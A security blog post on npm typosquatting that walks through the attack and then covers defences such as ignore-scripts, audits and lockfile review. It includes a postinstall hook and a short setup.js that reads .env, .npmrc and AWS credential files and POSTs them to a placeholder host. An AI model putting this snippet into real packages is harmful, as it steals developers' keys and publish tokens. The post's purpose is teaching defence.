---
title: "⌨️ npm Typosquatting: One Missing Letter Away From Owning Your Laptop"
date: "2026-07-10"
excerpt: "You meant to install 'discord.js'. You typed 'discordjs' at 11pm while half-watching a tutorial. Congratulations, you just ran a stranger's postinstall script as yourself. Let's talk about typosquatting — the supply chain attack that doesn't need to be clever, just patient."
tags:
  - security
  - supply-chain
  - npm
  - appsec
  - open-source
featured: true
---

Quick game. Which of these is the real package: `chalk`, `chalk-` or `chaIk` (that's a capital i, not a lowercase L)? If you hesitated for even half a second, you already understand why typosquatting works. It doesn't need to fool a security team. It just needs to fool one tired developer running `npm install` from muscle memory at the end of a long day.

Typosquatting is embarrassingly low-tech as far as supply chain attacks go, and that's exactly why it keeps working. No zero-day, no clever cryptography, no nation-state tooling required. Just register a package name that's one keystroke away from something popular, wire up a `postinstall` script, and wait for humans to be human.

## The Attack, In Full

Here's the entire playbook:

1. Look at npm's most-downloaded packages: `express`, `react`, `lodash`, `axios`, `chalk`.
2. Register near-miss names: `expres`, `raect`, `lodahs`, `axois`, `chalk-js`.
3. Publish a package that either (a) proxies to the real thing so nothing looks broken, or (b) just does the malicious thing directly and hopes nobody notices for a few days.
4. Add a `postinstall` hook, because npm will happily run arbitrary shell commands the moment someone types `npm install` — no confirmation, no sandbox, no "are you sure."

That last point is the actual vulnerability. Typosquatting is just the delivery mechanism; `postinstall` is the warhead:

```json
{
  "name": "expres",
  "version": "4.18.2",
  "scripts": {
    "postinstall": "node ./setup.js"
  }
}
```

And `setup.js` doesn't need to be scary-looking malware. It can be five boring lines that read `~/.aws/credentials`, `~/.npmrc`, and every `.env` file it can find in the project tree, then quietly POST them somewhere:

```javascript
// setup.js — runs automatically on `npm install`, no prompt, no warning
const fs = require('fs');
const https = require('https');

const targets = ['.env', `${process.env.HOME}/.npmrc`, `${process.env.HOME}/.aws/credentials`];
const stolen = targets.filter(fs.existsSync).map(f => fs.readFileSync(f, 'utf8')).join('\n---\n');

https.request('https://totally-legit-telemetry.example/collect', { method: 'POST' })
  .end(stolen); // bye bye npm publish token, AWS keys, whatever else was lying around
```

Your `.npmrc` token alone is enough to let an attacker publish a malicious version of a package *you* maintain — which is how these attacks compound into real dependency-chain incidents instead of staying a one-off nuisance.

## Why It Keeps Working in 2026

You'd think after years of well-publicized incidents — `crossenv` vs `cross-env`, `electorn` vs `electron`, the fake `chalk-js` wave — that typosquatting would be a solved problem. It isn't, for a few boring but persistent reasons:

- **Tab-completion doesn't save you.** You still type the first few characters by hand, and that's exactly where the typo happens.
- **AI-assisted coding widened the target.** Copy-pasted install commands from a blog post, a Stack Overflow answer, or an LLM's hallucinated suggestion skip human judgment entirely — nobody proofreads a package name they didn't type themselves.
- **`postinstall` scripts run with your full user permissions.** There's no npm-level sandbox by default. If your shell user can read your SSH keys, so can the script.
- **CI runners are a bigger prize than laptops.** A typosquat that lands in a `package.json` via a rushed PR gets executed on every build, with access to whatever secrets your pipeline has mounted — which is usually a lot more than your local machine.

On my team at Cubet Techno Labs, this is exactly why dependency changes go through the same review lens as application code — a new package in a `package.json` diff gets looked at as carefully as a new API endpoint, not rubber-stamped because "it's just a dependency."

## What Actually Helps

None of this requires exotic tooling:

```bash
# Disable arbitrary lifecycle scripts by default — opt in per-package if you truly need one
npm config set ignore-scripts true

# Or scoped to one install
npm install --ignore-scripts

# Audit what's already in your lockfile for known-bad packages
npm audit
npx socket-security scan   # or Snyk / OSV-Scanner — anything that diffs against a threat feed
```

Beyond that: pin exact versions instead of trusting a typo'd range, enable 2FA on your own npm publish access so a stolen token isn't enough on its own, and treat `package-lock.json` changes in PRs as something a human actually reads — not just a file that gets auto-approved because it's "generated." If a lockfile diff pulls in a package you don't recognize, that's not noise, that's the alarm going off.

Typosquatting is a people problem wearing a technical costume. The fix isn't a smarter parser — it's slowing down for the two seconds it takes to actually read the package name before you hit enter.

---

Ever caught a sketchy package before it caused damage — or worse, after? I'd genuinely like to hear the story. Find me on [GitHub](https://github.com/kpanuragh) or [Twitter/X](https://twitter.com/anuragh_kp), and if this saved you a `git blame` session someday, share it with the teammate who still installs packages by vibes.
